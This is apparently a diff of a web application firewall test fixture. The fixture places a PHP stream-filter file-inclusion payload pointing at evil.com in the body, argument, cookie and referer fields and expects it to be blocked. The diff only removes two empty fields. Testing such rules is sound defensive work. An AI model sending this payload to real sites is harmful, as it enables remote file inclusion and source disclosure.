@@ -5,9 +5,7 @@
         "Body": "param%RND%=php://filter/read=string.rot13/resource=http://evil.com/index.php",
         "ARGS": "param%RND%=php://filter/read=string.rot13/resource=http://evil.com/index.php",
         "Cookie": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
-        "URL": "",        
         "Referer": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
-        "Headers": "",
         "Blocked": true
       }
     ]
